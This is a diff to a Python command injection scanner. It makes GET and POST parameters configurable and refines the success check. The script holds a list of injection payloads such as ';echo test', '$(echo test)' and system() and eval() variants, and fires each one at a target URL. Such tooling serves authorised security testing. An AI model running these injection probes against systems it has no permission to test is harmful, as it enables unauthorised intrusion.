@@ -14,7 +14,7 @@ proxies = {
 }
 
 class osInjection:
-    def __init__(self, TargetUrl, headers=None, data=None, endpoint=None, PostOsInject=None,GetOsinject=None):
+    def __init__(self, TargetUrl, headers=None, data=None, endpoint=None, PostOsInject=None,osInjectGet=None):
         self.TargetUrl = TargetUrl
         self.hostName = self.getHostname(TargetUrl)
         self.headers = headers
@@ -22,7 +22,7 @@ class osInjection:
         self.endpoint = endpoint
         self.payloads =[';echo test', ';echo test #', '& echo test #', '& echo test &', '| echo test', '# echo test', '| echo test', '$(echo test)', '|| echo test', '| echo test |', '|| echo test ||', ';echo test;', '` ehoc test `', '%0a echo test %0a', ';echo test|', ';|/usr/bin/echo test|', '\\n/bin/echo test \\n', ";system('echo test')", ";system('echo test')", ";system('echo test')", "eval('echo test')", "eval('echo test');","response.write test", ":response.write test"]
         self.PostOsInject = PostOsInject
-        self.GetOsinject = GetOsinject
+        self.GetOsInject = osInjectGet
 
     def getHostname(self,url):
         parsedUrl = urlparse(url)
@@ -52,9 +52,9 @@ class osInjection:
    
     def checkOsInjectGet(self):
         try:
-            if "osInject" in self.TargetUrl:
+            if self.GetOsInject in self.TargetUrl:
                 for i in self.payloads:
-                    self.TargetUrl = self.TargetUrl.replace("osInject",i)
+                    self.TargetUrl = self.TargetUrl.replace(self.GetOsInject,i)
                     response = requests.get(self.TargetUrl)
                     if self.checkResponseResult(response):
                         print("osInject found in ",i,f"  {self.TargetUrl}")
@@ -73,7 +73,7 @@ class osInjection:
     
     def checkResponseResult(self, response):
         try:
-            if response.status_code == 200 and "test" in response.text:
+            if response.status_code == 200 and "test" in response.text and "echo" not in response.text:
                 return True
             else:
                 return False
@@ -91,19 +91,23 @@ if __name__ == "__main__":
     parser.add_argument('--headers', type=str, help='Input dictionary headers like {"key":"value"}')
     parser.add_argument('--postData', type=str, help='Input dictionary PostData like {"key":"value"}')
     parser.add_argument('--endpoint', type=str, help='Input str')
-    parser.add_argument('--osInject', type=str, help='Input which will be the payload')
+    parser.add_argument('--osInjectPost', type=str, help='Input which will be the payload')
+    parser.add_argument('--osInjectGet', type=str, help='Input which will be the payload')
+
 
 
 
 
     args = parser.parse_args()
     url = args.url
-    headers = json.loads(args.headers)
-    PostData = json.loads(args.postData)
+    headers = json.loads(args.headers) if args.headers else None
+    PostData = json.loads(args.postData) if args.postData else None
     EndPoint = args.endpoint
-    osInject = args.osInject
+    osInjectPost = args.osInjectPost
+    osInjectGet= args.osInjectGet
 
-    Test = osInjection(TargetUrl=url,headers=headers,data=PostData,endpoint=EndPoint,PostOsInject=osInject)
-    Test.checkOsInjectPost()
+
+    Test = osInjection(TargetUrl=url,headers=headers,data=PostData,endpoint=EndPoint, PostOsInject=osInjectPost, osInjectGet=osInjectGet)
+    Test.checkOsInjectGet()
 
     
